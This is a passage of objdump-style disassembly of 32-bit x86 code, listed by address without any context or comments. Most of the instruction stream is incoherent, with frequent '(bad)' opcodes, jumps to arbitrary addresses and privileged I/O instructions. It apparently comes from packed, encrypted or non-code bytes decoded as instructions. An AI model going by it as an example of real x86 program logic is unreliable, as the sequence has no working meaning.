  43e1ae:	and    DWORD PTR [ecx],0xdf960d2d
  43e1b4:	jle    0x43e17e
  43e1b6:	mov    ds:0xb2984373,eax
  43e1bb:	test   DWORD PTR [eax-0x328d49c0],0xc0b2e88
  43e1c5:	nop
  43e1c6:	mov    dl,0x5c
  43e1c8:	inc    esi
  43e1c9:	xchg   esp,eax
  43e1ca:	das    
  43e1cb:	aas    
  43e1cc:	dec    BYTE PTR [eax-0x6ff3f0d5]
  43e1d2:	mov    dl,0x74
  43e1d4:	push   esp
  43e1d5:	pushf  
  43e1d6:	mov    dl,0xf8
  43e1d8:	jg     0x43e179
  43e1da:	stos   BYTE PTR es:[edi],al
  43e1db:	push   cs
  43e1dc:	jmp    0xe96d7774
  43e1e1:	(bad)  
  43e1e2:	lods   al,BYTE PTR ds:[esi]
  43e1e3:	lea    esp,[esi+0x0]
  43e1e9:	add    BYTE PTR [edi+0x13],ch
  43e1ec:	sbb    DWORD PTR [edx+ebx*4-0x56],esp
  43e1f0:	push   cs
  43e1f1:	jmp    0xcc5652fe
  43e1f6:	fst    DWORD PTR ds:0xabdee9ea
  43e1fc:	lea    eax,[eax]
  43e1fe:	inc    edi
  43e1ff:	stos   BYTE PTR es:[edi],al
  43e200:	xchg   ebx,eax
  43e201:	(bad)  
  43e202:	cmp    edx,DWORD PTR [ebx]
  43e204:	jmp    0x285c:0xec2dc6a
  43e20b:	repnz push ecx
  43e20d:	add    eax,esp
  43e20f:	push   0x5a62e94e
  43e214:	out    0xce,al
  43e216:	inc    ebx
  43e217:	sbb    cl,BYTE PTR [ecx+0x72]
  43e21a:	stc    
  43e21b:	ja     0x43e1e9
  43e21d:	icebp  
  43e21e:	xchg   ebx,eax
  43e21f:	sub    eax,0x2bc70141
  43e224:	sub    DWORD PTR [eax-0x47],esp
  43e227:	push   ss
  43e228:	cwde   
  43e229:	aaa    
  43e22a:	mov    WORD PTR [ebp+0x10],ds
  43e22d:	jmp    0x91d194c5
  43e232:	jle    0x43e1dd
  43e234:	xchg   ebx,eax
  43e235:	dec    eax
  43e236:	mov    ?,WORD PTR [edx-0x4d69bcf2]
  43e23c:	push   cs
  43e23d:	jmp    0xe64a62d6
  43e242:	or     BYTE PTR [ecx],bl
  43e244:	adc    cl,ch
  43e246:	xchg   ebx,eax
  43e247:	mov    WORD PTR [esi],cs
  43e249:	rcl    DWORD PTR [ebx+0x510e8c],cl
  43e24f:	add    BYTE PTR [eax],al
  43e251:	add    BYTE PTR [eax],al
  43e253:	jae    0x43e2cc
  43e255:	push   cs
  43e256:	jmp    0x62625477
  43e25b:	push   edx
  43e25c:	mov    esi,0xe3f0095
  43e261:	rol    BYTE PTR [ecx+eax*4],1
  43e264:	add    eax,0x915d5de9
  43e269:	dec    edi
  43e26a:	adc    al,0xf2
  43e26c:	int3   
  43e26d:	push   ss
  43e26e:	(bad)  
  43e26f:	jge    0x43e277
  43e271:	xchg   ebx,eax
  43e272:	add    DWORD PTR [edi],esp
  43e274:	or     dl,BYTE PTR [ebx+0x57915d46]
  43e27a:	or     BYTE PTR [edi+0x380816ba],ch
  43e280:	les    eax,FWORD PTR [edx]
  43e282:	mov    ebp,edi
  43e284:	and    DWORD PTR [ebx+0x548f5d4e],edx
  43e28a:	or     BYTE PTR [esi+esi*8-0x4a5f7aea],ch
  43e291:	push   cs
  43e292:	add    BYTE PTR [edx+0x2d8816cb],ah
  43e298:	pop    es
  43e299:	jmp    0x4fd4fffb
  43e29e:	adc    al,0x82
  43e2a0:	jae    0x43e2b8
  43e2a2:	(bad)  
  43e2a3:	in     eax,dx
  43e2a4:	or     eax,0xaa700ea
  43e2a9:	xchg   ebx,eax
  43e2aa:	inc    esi
  43e2ab:	fst    QWORD PTR [eax-0x45c0f7c1]
  43e2b1:	(bad)  
  43e2b2:	(bad)  
  43e2b3:	clc    
  43e2b4:	ret    
  43e2b5:	add    cl,BYTE PTR [ebx+0x0]
  43e2bb:	add    BYTE PTR [edi-0xeb16cf6],ch
  43e2c1:	sti    
  43e2c2:	or     eax,0x44b6b908
  43e2c7:	adc    al,0x42
  43e2c9:	jnp    0x43e2cd
  43e2cb:	mov    ebx,DWORD PTR [edi-0x26fb2ff2]
  43e2d1:	mov    ch,0xe9
  43e2d3:	pop    ebp
  43e2d4:	lods   eax,DWORD PTR ds:[esi]
  43e2d5:	nop
  43e2d6:	pop    DWORD PTR [ecx+edi*4-0x6f74f14b]
  43e2dd:	pop    ecx
  43e2de:	loop   0x43e35c
  43e2e0:	cwde   
  43e2e1:	adc    al,BYTE PTR [edi+0x3]
  43e2e4:	sbb    eax,0x9fe5135c
  43e2e9:	pushf  
  43e2ea:	jg     0x43e273
  43e2ec:	nop
  43e2ed:	sbb    ecx,DWORD PTR [esi]
  43e2ef:	(bad)  
  43e2f0:	hlt    
  43e2f1:	adc    dl,BYTE PTR [ecx+0x125792f7]
  43e2f7:	sub    eax,0xb816a450
  43e2fc:	xchg   esp,eax
  43e2fd:	sbb    ecx,DWORD PTR [esi]
  43e2ff:	add    BYTE PTR [ebx],cl
  43e301:	dec    ecx
  43e302:	out    0x87,al
  43e304:	xchg   esp,eax
  43e305:	jmp    0x1457:0x849c5a12
  43e30c:	or     ebx,DWORD PTR [ecx-0x1a]
  43e30f:	ror    DWORD PTR [ebx+edx*1+0xfcdfee9],0xd7
  43e317:	inc    ecx
  43e318:	mov    WORD PTR [edx+0x12],gs
  43e31b:	add    BYTE PTR [eax+0xfed6f2],dl
  43e321:	add    BYTE PTR [eax],al
  43e323:	add    BYTE PTR [eax],al
  43e325:	pop    ss
  43e326:	sbb    ebp,DWORD PTR [ebx+0x4f]
  43e329:	mov    ah,0x84
  43e32b:	sub    ch,BYTE PTR [edi+edi*8]
  43e32e:	push   esp
  43e32f:	stc    
  43e330:	int    0x10
  43e332:	std    
  43e333:	loop   0x43e325
  43e335:	ftst   
  43e337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e338:	jg     0x43e32b
  43e33a:	sbb    al,0x14
  43e33c:	iret   
  43e33d:	sbb    eax,ebx
  43e33f:	fdivrp st(0),st
  43e341:	mov    ecx,0xf17fa504
  43e346:	adc    dl,BYTE PTR [edi+ecx*8]
  43e349:	sbb    eax,ebx
  43e34b:	loop   0x43e33d
  43e34d:	jmp    0xb1c38866
  43e352:	push   ds
  43e353:	adc    al,0xcf
  43e355:	adc    eax,DWORD PTR [ebx+0xe]
  43e358:	test   DWORD PTR [esi-0x4e],ebx
  43e35b:	fild   WORD PTR [eax]
  43e35d:	add    esi,edx
  43e35f:	cmc    
  43e360:	mov    bl,0x14
  43e362:	ja     0x43e353
  43e364:	jnp    0x43e2e9
  43e366:	mov    edx,0x3ba431f6
  43e36b:	mov    edx,0xcb810cf7
  43e370:	add    BYTE PTR [edx+0x7a],al
  43e373:	sti    
  43e374:	jl     0x43e357
  43e376:	mov    edx,0xb180006f
  43e37b:	shl    edi,1
  43e37d:	or     al,0x69
  43e37f:	jmp    0x43e381
  43e381:	and    ah,BYTE PTR [ebp-0x6]
  43e384:	jl     0x43e357
  43e386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e387:	ins    BYTE PTR es:[edi],dx
  43e388:	inc    edx
  43e389:	add    BYTE PTR [eax],al
  43e38b:	add    BYTE PTR [eax],al
  43e38d:	add    BYTE PTR [eax+0x46fbcc3a],bl
  43e393:	outs   dx,BYTE PTR ds:[esi]
  43e394:	ret    
  43e395:	jl     0x43e360
  43e397:	scas   al,BYTE PTR es:[edi]
  43e398:	lock cdq 
  43e39a:	into   
  43e39b:	mov    eax,0x3b844a6c
  43e3a0:	sub    bh,ah
  43e3a2:	movsx  esp,di
  43e3a5:	add    bh,BYTE PTR [edx+0x74396ca6]
  43e3ab:	mov    edi,0x3b913581
  43e3b0:	cmp    bh,al
  43e3b2:	or     al,0x81
  43e3b4:	fistp  QWORD PTR [ebx-0x5d]
  43e3b7:	mov    edx,0x3b9c31f6
  43e3bc:	jb     0x43e345
  43e3be:	out    dx,eax
  43e3bf:	psubb  mm7,QWORD PTR [ecx+ebx*2-0x5a]
  43e3c4:	je     0x43e391
  43e3c6:	xchg   esi,eax
  43e3c7:	test   eax,edi
  43e3c9:	mov    edx,ebp
  43e3cb:	psubb  mm0,QWORD PTR [ebx]
  43e3ce:	mov    ch,0xa7
  43e3d0:	je     0x43e363
  43e3d2:	btr    edi,esi
  43e3d5:	add    edi,DWORD PTR [esi+0xce00e8e]
  43e3db:	or     BYTE PTR ds:0xcedd97ed,cl
  43e3e1:	push   edx
  43e3e2:	mov    cs,WORD PTR [edx+0x13]
  43e3e5:	jmp    0xbfd9967d
  43e3ea:	fwait
  43e3eb:	aaa    
  43e3ec:	adc    edi,eax
  43e3ee:	xchg   edx,eax
  43e3ef:	ins    BYTE PTR es:[edi],dx
  43e3f0:	add    dh,BYTE PTR [edx+0x0]
  43e3f3:	add    BYTE PTR [eax],al
  43e3f5:	add    BYTE PTR [eax],al
  43e3f7:	shr    DWORD PTR [esi+0x3587a795],1
  43e3fd:	pop    eax
  43e3fe:	in     eax,0xf4
  43e400:	popa   
  43e401:	push   ss
  43e402:	popa   
  43e403:	outs   dx,DWORD PTR ds:[esi]
  43e404:	mov    edi,0x365fc70f
  43e409:	push   ecx
  43e40a:	std    
  43e40b:	adc    al,0x87
  43e40d:	(bad)  
  43e40e:	call   0x95465de7
  43e413:	jb     0x43e44d
  43e415:	dec    edi
  43e416:	ffree  st(4)
  43e418:	popa   
  43e419:	push   ss
  43e41a:	jno    0x43e3b3
  43e41c:	mov    edi,0x363f970f
  43e421:	pop    ecx
  43e422:	int    0xad
  43e424:	js     0x43e429
  43e426:	jb     0x43e3f6
  43e428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e429:	xchg   ebp,eax
  43e42a:	aaa    
  43e42b:	sbb    al,0x37
  43e42d:	sbb    edi,ecx
  43e42f:	mov    WORD PTR [edx+eax*1+0x62],gs
  43e433:	into   
  43e434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e435:	xchg   ebp,eax
  43e436:	pop    ds
  43e437:	add    BYTE PTR [esi-0x796bf29c],cl
  43e43d:	jmp    DWORD PTR [ecx+0x4e]
  43e440:	mov    edx,0xc2af623f
  43e445:	ds cmp ah,al
  43e448:	jl     0x43e48f
  43e44a:	jmp    0xd9961be2
  43e44f:	into   
  43e450:	jo     0x43e480
  43e452:	jmp    0x5296ea
  43e457:	div    BYTE PTR [edi+0x12]
  43e45a:	inc    ebp
  43e45b:	add    BYTE PTR [eax],al
  43e45d:	add    BYTE PTR [eax],al
  43e45f:	add    BYTE PTR [ecx+0x54e90eb2],ch
  43e465:	mov    dh,0xe
  43e467:	add    BYTE PTR [edx],dh
  43e469:	rcr    BYTE PTR [esi],1
  43e46b:	add    DWORD PTR [eax+0xe],0xffffffa9
  43e46f:	loope  0x43e41e
  43e471:	xor    eax,0xb2b100a9
  43e476:	push   cs
  43e477:	cmp    DWORD PTR [edi],eax
  43e479:	(bad)  
  43e47d:	arpl   WORD PTR [esi],bp
  43e47f:	mov    esi,edi
  43e481:	cmp    ch,dl
  43e483:	jmp    FWORD PTR [ecx-0x47]
  43e486:	test   al,0x7c
  43e488:	inc    edi
  43e489:	xor    edx,esp
  43e48b:	push   es
  43e48c:	sub    al,0xb6
  43e48e:	xchg   ebx,eax
  43e48f:	ret    
  43e490:	or     BYTE PTR ds:0xfeead23b,0xf
  43e497:	pinsrw mm6,eax,0x94
  43e49b:	inc    edx
  43e49c:	cmp    ebp,ecx
  43e49e:	jmp    0x43e4d2
  43e4a0:	imul   esi,edi,0x4a3206c9
  43e4a6:	imul   edi,DWORD PTR [esi-0x53],0xffffffb1
  43e4aa:	bound  eax,QWORD PTR [ebx]
  43e4ac:	mov    edx,0xb4b80a4e
  43e4b1:	add    DWORD PTR [eax+ecx*1],ebp
  43e4b4:	ss pop ss
  43e4b6:	xor    ecx,edx
  43e4b8:	dec    eax
  43e4b9:	out    dx,eax
  43e4ba:	xchg   esp,eax
  43e4bb:	add    al,0x3
  43e4bd:	div    ecx
  43e4bf:	add    al,0xea
  43e4c1:	lock xchg edx,eax
  43e4c3:	enter  0x0,0x0
  43e4c7:	add    BYTE PTR [eax],al
  43e4c9:	sub    BYTE PTR [edi],dl
  43e4cb:	or     eax,0xcf89312b
  43e4d0:	(bad)  
  43e4d1:	mov    bh,0xba
  43e4d3:	jns    0x43e4d5
  43e4d5:	jmp    0x9111db8b
  43e4da:	xor    cl,bl
  43e4dc:	clc    
  43e4dd:	adc    edi,DWORD PTR [esi-0x16c3ff92]
  43e4e3:	call   0xc68d3498
  43e4e8:	mov    ecx,0x8d884ab
  43e4ed:	out    0xac,eax
  43e4ef:	add    ch,al
  43e4f1:	frstor [eax-0x28]
  43e4f4:	clc    
  43e4f5:	sub    bl,BYTE PTR [ebx]
  43e4f7:	dec    eax
  43e4f8:	add    BYTE PTR [edx],ch
  43e4fa:	sbb    eax,esi
  43e4fc:	jne    0x43e4e3
  43e4fe:	sbb    ecx,DWORD PTR [esi]
  43e500:	xchg   edi,ecx
  43e502:	or     ecx,DWORD PTR [ebp-0x16a96b87]
  43e508:	adc    BYTE PTR [ebx+0x1b],0xe
  43e50c:	add    BYTE PTR [ebx],bl
  43e50e:	push   ebp
  43e50f:	cli    
  43e510:	jl     0x43e4fa
  43e512:	or     ecx,DWORD PTR [esi]
  43e514:	or     DWORD PTR [esp+edi*2],edx
  43e517:	or     eax,0x81149000
  43e51c:	aas    
  43e51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e51e:	nop
  43e51f:	sub    edx,DWORD PTR [ecx+ebx*1]
  43e522:	inc    esi
  43e523:	out    0x36,al
  43e525:	(bad)  
  43e526:	sti    
  43e527:	cmp    al,0x67
  43e529:	and    BYTE PTR [eax+0x1453],dl
  43e52f:	add    BYTE PTR [eax],al
  43e531:	add    BYTE PTR [ebx+0x55],ch
  43e534:	jmp    0x131c:0x20805c72
  43e53b:	xchg   ecx,eax
  43e53c:	add    BYTE PTR cs:[edx+eax*1+0x686bf17],bl
  43e544:	pop    es
  43e545:	mov    edi,0x8508060
  43e54a:	xchg   ebx,eax
  43e54b:	pop    edx
  43e54c:	push   0x1dabc048
  43e551:	call   0x56869f
  43e556:	sbb    DWORD PTR [edx+0x32e81438],esi
  43e55c:	jge    0x43e52b
  43e55e:	fdivr  DWORD PTR [eax]
  43e560:	cmp    bh,al
  43e562:	adc    al,0xfa
  43e564:	outs   dx,BYTE PTR ds:[esi]
  43e565:	aas    
  43e566:	cwde   
  43e567:	leave  
  43e568:	cmp    DWORD PTR [eax],eax
  43e56a:	inc    esp
  43e56b:	ficomp WORD PTR [esi+esi*1-0x6c]
  43e56f:	cmp    DWORD PTR [esi],ebp
  43e571:	hlt    
  43e572:	adc    al,0x64
  43e574:	xlat   BYTE PTR ds:[ebx]
  43e575:	jns    0x43e512
  43e577:	mov    ds:0x3a882e5c,eax
  43e57c:	cld    
  43e57d:	jmp    0x43e58b
  43e57f:	jg     0x43e570
  43e581:	mov    ecx,DWORD PTR [esi-0x78fc07f4]
  43e587:	jbe    0x43e554
  43e589:	add    dl,dl
  43e58b:	rcr    BYTE PTR [esi+esi*1-0x6c],cl
  43e58f:	mov    ebx,0xc9844268
  43e594:	mov    cl,0x23
  43e596:	add    BYTE PTR [eax],al
  43e598:	add    BYTE PTR [eax],al
  43e59a:	add    dh,dh
  43e59c:	sub    bl,BYTE PTR [ebp+0x36]
  43e59f:	jl     0x43e5d0
  43e5a1:	scas   al,BYTE PTR es:[edi]
  43e5a2:	pop    ds
  43e5a3:	nop
  43e5a4:	xchg   bl,ah
  43e5a6:	js     0x43e579
  43e5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e5a9:	mov    esp,0xbca5c1c2
  43e5ae:	ret    0x37cf
  43e5b1:	mov    dl,0xfb
  43e5b3:	xor    al,0xf3
  43e5b5:	ins    BYTE PTR es:[edi],dx
  43e5b6:	cmp    eax,0xdb866260
  43e5bb:	and    DWORD PTR [edx-0x9],ebp
  43e5be:	add    edx,DWORD PTR [edi]
  43e5c0:	je     0x43e5c9
  43e5c2:	jns    0x43e585
  43e5c4:	scas   al,BYTE PTR es:[edi]
  43e5c5:	ins    BYTE PTR es:[edi],dx
  43e5c6:	inc    ebp
  43e5c7:	mov    al,0xc7
  43e5c9:	xor    eax,0xb8bc82f8
  43e5ce:	inc    ebp
  43e5cf:	mov    al,0xb2
  43e5d1:	test   DWORD PTR [ebx],0x2f0ef390
  43e5d7:	cwde   
  43e5d8:	jae    0x43e5e8
  43e5da:	jmp    0xedac7372
  43e5df:	call   0xeb2:0x934893b9
  43e5e6:	bound  ecx,QWORD PTR [ebp-0x3fef7252]
  43e5ec:	or     ebx,DWORD PTR [ecx]
  43e5ee:	ins    DWORD PTR es:[edi],dx
  43e5ef:	ds or  ebp,edx
  43e5f2:	jmp    0x6246472f
  43e5f7:	push   ebp
  43e5f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e5f9:	and    eax,0x1f7f9027
  43e5fe:	jb     0x43e600
  43e600:	add    BYTE PTR [eax],al
  43e602:	add    BYTE PTR [eax],al
  43e604:	pop    ebp
  43e605:	scas   al,BYTE PTR es:[edi]
  43e606:	(bad)  
  43e607:	loopne 0x43e680
  43e609:	mov    dl,0x62
  43e60b:	lock cwde 
  43e60d:	dec    esp
  43e60e:	popa   
  43e60f:	hlt    
  43e610:	or     BYTE PTR [ebx+0x1e],bh
  43e613:	adc    dl,BYTE PTR [edx+0x7b]
  43e616:	xchg   ebp,eax
  43e617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e618:	jnp    0x43e628
  43e61a:	rcr    BYTE PTR [ecx-0x6f77e55e],1
  43e620:	xchg   ebx,eax
  43e621:	mov    dl,0x97
  43e623:	scas   al,BYTE PTR es:[edi]
  43e624:	sbb    DWORD PTR [edx],0xffffffd0
  43e627:	adc    eax,DWORD PTR [edx+ecx*1-0x6a]
  43e62b:	scas   eax,DWORD PTR es:[edi]
  43e62c:	inc    edi
  43e62d:	ss mov edi,0x62becdd2
  43e633:	leave  
  43e634:	mov    eax,0x65722e79
  43e639:	scas   al,BYTE PTR es:[edi]
  43e63a:	xchg   ebp,eax
  43e63b:	xchg   edx,eax
  43e63c:	aas    
  43e63d:	mov    edx,0xcc28cda0
  43e642:	xchg   edi,eax
  43e643:	aaa    
  43e644:	je     0x43e67b
  43e646:	pop    ecx
  43e647:	icebp  
  43e648:	fwait
  43e649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e64a:	push   ss
  43e64b:	(bad)  
  43e64c:	push   edx
  43e64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e64e:	xchg   ebx,eax
  43e64f:	mov    dl,0x61
  43e651:	push   ebx
  43e652:	test   BYTE PTR [eax],0xec
  43e655:	cmp    ebp,ecx
  43e657:	(bad)  
  43e658:	jmp    0xc58a7a0b
  43e65d:	xor    esp,DWORD PTR [edx+0x2c]
  43e660:	stc    
  43e661:	jp     0x43e66d
  43e663:	mov    ebp,DWORD PTR [edi+0xc22302]
  43e669:	add    BYTE PTR [eax],al
  43e66b:	add    BYTE PTR [eax],al
  43e66d:	jg     0x43e670
  43e66f:	xchg   ebx,eax
  43e670:	dec    esi
  43e671:	mov    cl,0xab
  43e673:	test   al,0x50
  43e675:	mov    edx,0xf957934c
  43e67a:	lds    ebx,FWORD PTR [eax-0x18]
  43e67d:	imul   ebx,ebp,0x6f30000e
  43e683:	push   ds
  43e684:	test   DWORD PTR [edx],eax
  43e686:	popa   
  43e687:	adc    BYTE PTR [ecx+0x46cfced7],cl
  43e68d:	lods   eax,DWORD PTR ds:[esi]
  43e68e:	fisttp DWORD PTR [esi]
  43e690:	add    BYTE PTR [ecx+0x31],bh
  43e693:	push   0x8d0d4204
  43e698:	mov    ds:0x8b0eb669,eax
  43e69d:	das    
  43e69e:	adc    ch,BYTE PTR [ebx+0x78]
  43e6a1:	popf   
  43e6a2:	scas   al,BYTE PTR es:[edi]
  43e6a3:	pop    ss
  43e6a4:	test   dh,al
  43e6a6:	scas   al,BYTE PTR es:[edi]
  43e6a7:	push   cs
  43e6a8:	add    dl,ah
  43e6aa:	les    eax,FWORD PTR [edx]
  43e6ac:	jmp    0x43e718
  43e6ae:	mov    edx,DWORD PTR [eax+0x0]
  43e6b1:	mov    dl,0x74
  43e6b3:	add    bh,BYTE PTR [ebx]
  43e6b5:	out    dx,eax
  43e6b6:	add    DWORD PTR [ebp+0x31],ebx
  43e6b9:	ret    0xacc
  43e6bc:	adc    DWORD PTR [eax],0xffffffa2
  43e6bf:	push   cs
  43e6c0:	je     0x43e702
  43e6c2:	mov    ecx,0x893c76a8
  43e6c7:	push   esi
  43e6c8:	xor    BYTE PTR [edx+0x6f8b59f0],al
  43e6ce:	push   es
  43e6cf:	jmp    0x43e692
  43e6d1:	add    BYTE PTR [eax],al
  43e6d3:	add    BYTE PTR [eax],al
  43e6d5:	add    BYTE PTR [eax-0x617dc35],dl
  43e6db:	ret    
  43e6dc:	adc    al,BYTE PTR [eax]
  43e6de:	or     ecx,ebx
  43e6e0:	add    ch,al
  43e6e2:	mov    eax,ds:0x1bf8d4e5
  43e6e7:	fcmovu st,st(6)
  43e6e9:	test   al,al
  43e6eb:	add    al,0x50
  43e6ed:	or     al,0x64
  43e6ef:	sti    
  43e6f0:	push   0x3784b049
  43e6f5:	sbb    al,0x1b
  43e6f7:	lds    ebp,FWORD PTR [esi]
  43e6f9:	or     esi,edi
  43e6fb:	pop    ss
  43e6fc:	jmp    0x3305f03f
  43e701:	test   DWORD PTR [esi+0x3],eax
  43e704:	sbb    bx,WORD PTR [eax+0xd144f80]
  43e70b:	and    eax,0x16aba73f
  43e710:	cdq    
  43e711:	(bad)  
  43e712:	xchg   edi,eax
  43e713:	sbb    ecx,DWORD PTR [esi]
  43e715:	test   esi,edx
  43e717:	call   DWORD PTR [eax+0x5a1bb477]
  43e71d:	sbb    al,0xb
  43e71f:	pop    ecx
  43e720:	cli    
  43e721:	xor    al,0x52
  43e723:	inc    ecx
  43e724:	fild   WORD PTR [esi+ebx*8-0x3f41f6ed]
  43e72b:	sbb    al,0xac
  43e72d:	test   bh,al
  43e72f:	jmp    0x43e753
  43e731:	dec    esi
  43e732:	push   0x9000358b
  43e737:	xchg   edx,eax
  43e738:	dec    esp
  43e739:	xor    BYTE PTR [eax],al
  43e73b:	add    BYTE PTR [eax],al
  43e73d:	add    BYTE PTR [eax],al
  43e73f:	or     eax,0x57013ec4
  43e744:	pop    ecx
  43e745:	jmp    0xae7d:0xe1b9060
  43e74c:	pop    ss
  43e74d:	ins    DWORD PTR es:[edi],dx
  43e74e:	jae    0x43e719
  43e750:	xchg   esp,eax
  43e751:	dec    edi
  43e752:	sbb    al,0x13
  43e754:	mov    dl,0x6f
  43e756:	sbb    BYTE PTR [eax+0x597d1e7e],dl
  43e75c:	sahf   
  43e75d:	je     0x43e722
  43e75f:	add    eax,0x81f809cc
  43e764:	scas   eax,DWORD PTR es:[edi]
  43e765:	mov    edi,0xa908ee75
  43e76a:	jge    0x43e7bd
  43e76c:	sahf   
  43e76d:	jb     0x43e7a3
  43e76f:	out    0xcb,al
  43e771:	add    eax,edi
  43e773:	pusha  
  43e774:	mov    edi,0x3da0315d
  43e779:	cmp    bh,ah
  43e77b:	pop    ss
  43e77c:	sahf   
  43e77d:	out    dx,eax
  43e77e:	jl     0x43e7e1
  43e780:	mov    edx,0xb290033e
  43e785:	test   DWORD PTR [edx],0x425c9e4a
  43e78b:	test   BYTE PTR [ecx+eax*1],bh
  43e78e:	adc    ebp,DWORD PTR [esi]
  43e790:	mov    dl,0xd
  43e792:	add    al,0x8
  43e794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e795:	out    0x2,eax
  43e797:	dec    edx
  43e798:	sahf   
  43e799:	mov    ebp,0x9fd67803
  43e79e:	add    edx,DWORD PTR [eax+0x13b139]
  43e7a4:	add    BYTE PTR [eax],al
  43e7a6:	add    BYTE PTR [eax],al
  43e7a8:	push   ecx
  43e7a9:	jno    0x43e7a6
  43e7ab:	push   edx
  43e7ac:	nop
  43e7ad:	mov    dl,0xf7
  43e7af:	test   cl,ch
  43e7b1:	sahf   
  43e7b2:	test   DWORD PTR [edi-0x75],0x58dab01a
  43e7b9:	or     BYTE PTR [ebp+0x49],dh
  43e7bc:	xor    BYTE PTR [edx+0x71512982],0xcf
  43e7c3:	enter  0x848,0x19
  43e7c7:	sub    eax,0x2a37c3d9
  43e7cc:	or     eax,0x97c58b0e
  43e7d1:	mov    dl,0xe
  43e7d3:	push   0xffffffd9
  43e7d5:	scas   al,BYTE PTR es:[edi]
  43e7d6:	push   cs
  43e7d7:	je     0x43e7aa
  43e7d9:	sub    eax,0xef7ce554
  43e7de:	(bad)  
  43e7df:	loope  0x43e7f0
  43e7e1:	mov    ebx,0xa37ea888
  43e7e6:	push   cs
  43e7e7:	bound  edi,QWORD PTR [esi-0x6c1a644a]
  43e7ed:	outs   dx,DWORD PTR ds:[esi]
  43e7ee:	(bad)  
  43e7ef:	enter  0xceea,0xbf
  43e7f3:	cli    
  43e7f4:	sub    al,BYTE PTR [edi+0x29d8e5e6]
  43e7fa:	shl    BYTE PTR [eax],1
  43e7fc:	or     eax,0xfad217e9
  43e801:	mov    esi,0x86af16c4
  43e806:	out    0xe5,al
  43e808:	dec    edi
  43e809:	stos   BYTE PTR es:[edi],al
  43e80a:	inc    ebp
  43e80b:	scas   al,BYTE PTR es:[edi]
  43e80c:	add    BYTE PTR [eax],al
  43e80e:	add    BYTE PTR [eax],al
  43e810:	add    BYTE PTR [eax-0x56],dl
  43e813:	retf   0x542f
  43e816:	mov    dl,0x49
  43e818:	xor    esp,edx
  43e81a:	or     ch,dl
  43e81c:	outs   dx,BYTE PTR ds:[esi]
  43e81d:	imul   ebp,DWORD PTR ds:0xafcdc4f4,0xb6ce720e
  43e827:	xchg   ebp,eax
  43e828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e829:	xchg   DWORD PTR [eax-0x4d6a8c19],ecx
  43e82f:	push   cs
  43e830:	mov    esp,0xe5698664
  43e835:	xchg   ebx,eax
  43e836:	jle    0x43e83d
  43e838:	xchg   edx,eax
  43e839:	push   eax
  43e83a:	jb     0x43e842
  43e83c:	or     eax,0xc60e7299
  43e841:	or     edi,esi
  43e843:	jmp    0x95ad4066
  43e848:	or     al,0x6e
  43e84a:	dec    eax
  43e84b:	pop    ss
  43e84c:	jmp    0x567265
  43e851:	sub    DWORD PTR [eax+0x0],edi
  43e854:	sub    DWORD PTR [edi+0x45750e77],0xffffff88
  43e85b:	test   eax,0xe9f7b50f
  43e860:	jmp    FWORD PTR [ecx]
  43e862:	cs loope 0x43e7ff
  43e865:	sti    
  43e866:	mov    dl,0xe
  43e868:	pcmpeqw mm4,mm6
  43e86b:	jmp    0x97cfd26f
  43e870:	mov    cl,ch
  43e872:	mov    dl,0xe
  43e874:	push   eax
  43e875:	add    BYTE PTR [eax],al
  43e877:	add    BYTE PTR [eax],al
  43e879:	add    BYTE PTR [edx-0xb],bh
  43e87c:	jmp    0x43e8f2
  43e87e:	repz jmp 0xc46a:0xef2ef7e3
  43e886:	in     eax,0xeb
  43e888:	sub    al,0x83
  43e88a:	lock mov dl,0x5d
  43e88d:	or     dl,BYTE PTR [ecx]
  43e88f:	mov    ebx,0x330effdd
  43e894:	into   
  43e895:	add    al,0x22
  43e897:	sbb    BYTE PTR [ebx+0xeae358e],dl
  43e89d:	add    BYTE PTR [edx+eax*1],ch
  43e8a0:	push   ecx
  43e8a1:	mov    esi,DWORD PTR [ebp-0x16e65e7f]
  43e8a7:	mov    dl,0x3c
  43e8a9:	dec    ecx
  43e8ab:	xor    esi,ecx
  43e8ad:	or     dl,bh
  43e8af:	imul   bl
  43e8b1:	jae    0x43e927
  43e8b3:	xor    edx,esp
  43e8b5:	add    esi,DWORD PTR [eax*1-0x638ab931]
  43e8bc:	jmp    0x43e8bd
  43e8be:	jns    0x43e8f3
  43e8c0:	stos   BYTE PTR es:[edi],al
  43e8c1:	pmaddwd mm4,QWORD PTR [ebx-0x17]
  43e8c5:	jmp    FWORD PTR [ecx+0x31]
  43e8c8:	loop   0x43e8cc
  43e8ca:	xchg   BYTE PTR ds:[ebp+0x1],dh
  43e8ce:	nop
  43e8cf:	sbb    ecx,DWORD PTR [esi]
  43e8d1:	mov    ch,0x91
  43e8d3:	sbb    ecx,DWORD PTR [esi]
  43e8d5:	add    BYTE PTR [ebx-0x28],bh
  43e8d8:	loope  0x43e85c
  43e8da:	adc    ebx,DWORD PTR [esi+ecx*1]
  43e8dd:	add    BYTE PTR [eax],al
  43e8df:	add    BYTE PTR [eax],al
  43e8e1:	add    BYTE PTR [eax],al
  43e8e3:	sbb    edx,DWORD PTR [edi-0x1e]
  43e8e6:	xor    al,0x53
  43e8e8:	jg     0x43e8ce
  43e8ea:	push   ecx
  43e8eb:	sub    BYTE PTR [eax+0x24],bl
  43e8ee:	add    BYTE PTR [eax-0x4fc5668],dl
  43e8f4:	int3   
  43e8f5:	(bad)  
  43e8f6:	not    DWORD PTR [ebp-0x6f99dba1]
  43e8fc:	popa   
  43e8fd:	adc    ah,BYTE PTR [esi-0x70]
  43e900:	popf   
  43e901:	retf   0x55e9
  43e904:	sbb    ecx,DWORD PTR [esi]
  43e906:	jge    0x43e8dc
  43e908:	jmp    0x43e896
  43e90a:	jp     0x43e890
  43e90c:	sbb    BYTE PTR [edi],bh
  43e90e:	xor    ebx,DWORD PTR [ebx]
  43e910:	(bad)  
